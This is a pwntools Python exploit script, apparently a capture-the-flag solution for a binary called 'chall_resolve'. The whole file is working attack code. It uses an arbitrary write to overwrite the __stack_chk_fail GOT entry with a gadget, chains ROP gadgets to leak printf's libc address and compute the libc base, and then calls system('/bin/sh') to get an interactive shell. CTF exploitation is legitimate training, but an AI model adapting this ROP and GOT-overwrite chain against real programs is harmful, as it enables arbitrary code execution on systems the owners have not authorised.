from pwn import *

filename = './chall_resolve'
chall = ELF(filename)

libcname = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libcname)

# conn = remote('localhost', 9001)
conn = process(filename)
# conn = gdb.debug(filename, '''
# b *0x401230
# ''')

# chall
bss_addr = chall.bss()
main_addr = chall.functions['main'].address
info('main_addr = 0x{:08x}'.format(main_addr))
stack_chk_fail_got = chall.got['__stack_chk_fail']
printf_got = chall.got['printf']
printf_plt = chall.plt['printf']

## 0x00000000004012a3: pop rdi; ret;
pop_rdi = 0x00000000004012a3
## 0x000000000040101a: ret;
ret = 0x000000000040101a
## 0x00000000004012a2: pop r15; ret;
pop_ret = 0x00000000004012a2
## 0x00000000004012a0: pop r14; pop r15; ret;
pop_pop_ret = 0x00000000004012a0
## 0x000000000040129e: pop r13; pop r14; pop r15; ret;
pop_pop_pop_ret = 0x000000000040129e
## 0x000000000040129c: pop r12; pop r13; pop r14; pop r15; ret;
pop_pop_pop_pop_ret = 0x000000000040129c
# 0x7ffca1426d58

# libc
printf_libc = libc.functions['printf'].address
system_libc = libc.functions['system'].address
shell_str_libc = next(libc.search(b'/bin/sh'))
info('shelllibc = 0x{:08x}'.format(shell_str_libc))
buf1 = p64(pop_rdi)
buf1 += p64(printf_got)
buf1 += p64(printf_plt)
buf1 += p64(ret)
buf1 += p64(main_addr)
# buf1 += b'a'*(0x79-len(buf1))

print(conn.sendlineafter(b'Input message >> ', buf1))

# Ignite ROP Chain
# AAW(stack_chk_fail_got, pop_pop_pop_pop_ret)
print(conn.sendlineafter(b'Input address >> ', str(hex(stack_chk_fail_got)).encode()))
print(conn.sendafter(b'Input value   >> ', str(hex(pop_pop_pop_ret)).encode()))
conn.send(p64(0xdeadbeef))

# Leak libc address
printf_leak = u64(conn.recv(6)+b'\x00\x00')
libc_base = printf_leak - printf_libc
info('printf_leak = 0x{:08x}'.format(printf_leak))
info('libc_base   = 0x{:08x}'.format(libc_base))

buf2 = p64(pop_rdi)
buf2 += p64(shell_str_libc+libc_base)
buf2 += p64(ret)
buf2 += p64(system_libc+libc_base)

print(conn.sendlineafter(b'Input message >> ', buf2))
print(conn.sendlineafter(b'Input address >> ', str(hex(stack_chk_fail_got)).encode()))
print(conn.sendlineafter(b'Input value   >> ', str(hex(pop_pop_pop_pop_ret)).encode()))

conn.interactive()
